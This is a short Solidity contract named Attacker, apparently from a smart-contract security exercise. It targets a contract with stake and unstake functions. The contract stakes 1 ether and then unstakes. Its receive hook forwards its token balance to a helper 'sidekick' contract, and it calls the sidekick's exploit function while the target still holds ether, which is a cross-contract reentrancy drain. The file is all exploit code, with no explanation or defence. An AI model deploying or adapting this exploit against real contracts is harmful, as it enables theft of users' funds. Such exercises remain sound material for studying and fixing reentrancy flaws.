// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IVulnerable {
    function stake() external payable;

    function unstake() external;
}

interface ISidekick {
    function exploit() external payable;
}

contract Attacker {
    using SafeERC20 for IERC20;

    IVulnerable public target;
    IERC20 public token;
    ISidekick public sidekick;

    uint256 public counter;

    constructor(address _target, address tkn) {
        target = IVulnerable(_target);
        token = IERC20(tkn);
    }

    function setSidekick(address _sidekick) public {
        sidekick = ISidekick(_sidekick);
    }

    receive() external payable {
        uint256 tokenBalance = token.balanceOf(address(this));
        token.transfer(address(sidekick), tokenBalance);
    }

    function exploit() public payable {
        // Deposit funds
        target.stake{value: 1 ether}();

        target.unstake();

        if (address(target).balance > 0) {
            sidekick.exploit();
        }
    }
}
